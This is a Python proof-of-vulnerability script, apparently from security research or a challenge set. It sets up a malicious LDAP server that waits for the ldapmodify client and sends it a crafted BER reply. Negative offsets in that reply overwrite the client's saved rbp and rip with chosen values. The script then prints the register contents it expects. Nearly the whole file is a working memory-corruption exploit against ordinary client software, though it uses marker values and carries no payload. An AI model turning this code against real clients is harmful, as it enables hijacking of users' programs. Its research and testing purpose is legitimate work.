#!/usr/bin/env python3

import sys
import socket
import struct
import os
import subprocess

def start_listener( port ):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        s.bind(('0.0.0.0', port) )
    except:
        print('[ERROR] Failed to bind to: %d' %port)
        sys.exit(0)

    s.listen(5)

    print('[INFO] Listener started on port: %d' %port)

    return s

def parse_ber( ber_data ):

    if len(ber_data) < 2:
        return ( [], -1 )

    msgid = ber_data[0]

    length = ber_data[1]

    index = 2

    if ( length & 0x80 ):
        nb = length ^ 0x80

        length = 0

        if len(ber_data) < index + nb:
            return ( [], -1 )

        while ( nb ):
            length |= (ber_data[index] << ( (nb-1) * 8))

            index = index + 1
            nb = nb - 1
    
    if len(ber_data) < index + length:
        return ( [], -1)

    print('[INFO] msg_id: %x len: %x' %(msgid, length) )

    return ( ber_data[index:index+length], index + length )

def accept_connection( s ):
    client_socket, client_address = s.accept()

    y = client_socket.recv(1024)

    bv, ni = parse_ber( y )

    y = y[ni:]

    while ( ni != -1 ):
        bv, ni = parse_ber( y )

        if ni == -1:
            break

        y = y[ni:]

    z = b'\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00'

    client_socket.send(z)

    y = client_socket.recv(1024)

    bv, ni = parse_ber( y )

    z = b'\x30\x53'

    # Message ID
    z += b'\x67\x01\x02'

    z += b'\x04\x04'

    # iAA

    ## This part is the i
    z += b'\x04\x04\x00\x01\x23\x45'

    ## This part is the A
    z += b'\x04\x04\x45\x45\x45\x45'

    ## Another A
    z += b'\x04\x04\x45\x45\x45\x45'

    z += b'\xa0\x3a'

    start = -20

    ## bug control starts here
    z += b'\x06\x01\x07\x04\x51\x52\x53\x54\x06\x04' + struct.pack('>i', start)

    z += b'\x07\x01\x07\x01\x41\x07\x08' + struct.pack('Q', 0x494a4b4c44434241) ## rbp

    ## Second 4 byte write
    z += b'\x06\x01\x07\x04\x51\x52\x53\x54\x06\x04' + struct.pack('>i', start + 1)

    z += b'\x07\x01\x07\x01\x41\x07\x08' + struct.pack('Q', 0x504f4e4d48474645) ## rip

    '''
    ## third 4 byte write
    z += b'\x06\x01\x07\x04\x51\x52\x53\x54\x06\x04' + struct.pack('>i', start + 2)

    z += b'\x07\x01\x07\x01\x41\x07\x04' + struct.pack('Q', 0x4c4b4a49)

    ## fourth 4 byte write
    z += b'\x06\x01\x07\x04\x51\x52\x53\x54\x06\x04' + struct.pack('>i', start + 3)

    z += b'\x07\x01\x07\x01\x41\x07\x04' + struct.pack('Q', 0x504f4e4d)
    '''

    client_socket.send(z)

    y = client_socket.recv(1024)

    bv, ni = parse_ber( y )

    client_socket.close()

    print('R15: 0x414243444c4b4a49')
    print('*[RSP]: 0x454647484d4e4f50')
    sys.exit(0)

def check_env( TOOLPATH ):
    if os.path.isfile(TOOLPATH + '/.libs/lt-ldapmodify'):
        return

    args = [TOOLPATH + '/ldapmodify', '-h' ]

    res = subprocess.run( args, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    return

def main( argv ):
    if len(sys.argv) == 2:
        LISTENPORT = int(argv[1])
    else:
        if 'PORT' in os.environ:
            LISTENPORT = int(os.environ['PORT'])
        else:
            print('[USAGE] %s <listen_port>' %(argv[0]))
            print('     This pov opens a listening port and then waits for a connection from ldapmodify')
            print('     client tool with an ldif file to replace some data in an entry.')
            sys.exit(0)

    #check_env( TOOLPATH )

    s = start_listener( LISTENPORT )

    print(f'[INFO] Listening on {LISTENPORT} Now launch the client')

    accept_connection(s)


if __name__ == '__main__':
  main(sys.argv)